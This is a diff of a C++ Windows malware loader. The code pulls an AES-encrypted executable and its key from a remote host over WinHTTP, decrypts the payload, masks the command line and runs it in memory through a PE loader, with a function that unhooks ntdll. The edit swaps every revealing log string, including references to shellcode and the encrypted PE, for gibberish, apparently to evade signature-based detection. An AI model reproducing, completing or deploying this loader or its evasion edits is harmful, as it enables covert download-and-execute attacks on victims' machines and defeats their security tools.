@@ -115,7 +115,7 @@ DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
         hConnect = WinHttpConnect(hSession, whost,
             port, 0);
     else
-        printf("Failed in WinHttpConnect (%u)\n", GetLastError());
+        printf("Failed in asd (%u)\n", GetLastError());
 
     // Create an HTTP request handle.
     if (hConnect)
@@ -133,12 +133,12 @@ DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
             0, WINHTTP_NO_REQUEST_DATA, 0,
             0, 0);
     else
-        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());
+        printf("Failed in asd (%u)\n", GetLastError());
 
     // End the request.
     if (bResults)
         bResults = WinHttpReceiveResponse(hRequest, NULL);
-    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());
+    else printf("Failed in asdasd (%u)\n", GetLastError());
 
     // Keep checking for data until there is nothing left.
     if (bResults)
@@ -147,7 +147,7 @@ DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
             // Check for available data.
             dwSize = 0;
             if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
-                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());
+                printf("Error %u in asdada (%u)\n", GetLastError());
 
             // Allocate space for the buffer.
             pszOutBuffer = new char[dwSize + 1];
@@ -163,7 +163,7 @@ DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
 
                 if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                     dwSize, &dwDownloaded))
-                    printf("Error %u in WinHttpReadData.\n", GetLastError());
+                    printf("Error %u in rw.\n", GetLastError());
                 else {
 
                     buffer.insert(buffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
@@ -176,12 +176,12 @@ DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
 
         if (buffer.empty() == TRUE)
         {
-            printf("Failed in retrieving the Shellcode");
+            printf("Failed in asd the asdd");
         }
 
         // Report any errors.
         if (!bResults)
-            printf("Error %d has occurred.\n", GetLastError());
+            printf("Error %d has asd.\n", GetLastError());
 
         // Close any open handles.
         if (hRequest) WinHttpCloseHandle(hRequest);
@@ -628,7 +628,7 @@ BOOL Unhook(LPVOID cleanNtdll) {
 int main(int argc, char** argv) {
 
         if (argc != 5) {
-            printf("[+] Usage: %s <Host> <Port> <Cipher> <Key>\n", argv[0]);
+            printf("[+] WWWW: %s <Host> <Port> <CCC> <KeJJy>\n", argv[0]);
             return 1;
         }
 
@@ -657,33 +657,33 @@ int main(int argc, char** argv) {
 
         
 
-        printf("\n\n[+] Get AES Encrypted PE from %s:%d\n", host, port);
+        printf("\n\n[+] asd add asd asdd from %s:%d\n", host, port);
         DATA PE = GetData(whost, port, wpe);
         if (!PE.data) {
-            printf("[-] Failed in getting AES Encrypted PE\n");
+            printf("[-] Failed in DDWWS WRWER PE\n");
             return -1;
         }
 
-        printf("\n[+] Get AES Key from %s:%d\n", host, port);
+        printf("\n[+] as4r 234 asd 234 %s:%d\n", host, port);
         DATA keyData = GetData(whost, port, wkey);
         if (!keyData.data) {
             printf("[-] Failed in getting key\n");
             return -2;
         }
-        printf("\n[+] AES PE Address : %p\n", PE.data);
-        printf("\n[+] AES Key Address : %p\n", keyData.data);
+        printf("\n[+] 2r2 PE WRWEF : %p\n", PE.data);
+        printf("\n[+] hh3e wR WRRR : %p\n", keyData.data);
         
-        printf("\n[+] Decrypt the PE \n");
+        printf("\n[+] WRWR GEW WERW \n");
         DecryptAES((char*)PE.data, PE.len, (char*)keyData.data, keyData.len);
-        printf("\n[+] PE Decrypted\n");
+        printf("\n[+] WRWER WRRRR\n");
 
         // Fixing command line
-        sz_masqCmd_Ansi = (char*)"whatEver";
+        sz_masqCmd_Ansi = (char*)"WERWER";
         
-        printf("\n[+] Loading and Running PE\n");
+        printf("\n[+] WERWER and WERWER PE\n");
         PELoader((char*)PE.data, PE.len);
 
-        printf("\n[+] Finished\n");
+        printf("\n[+] WRWEW\n");
 
 
     return 0;
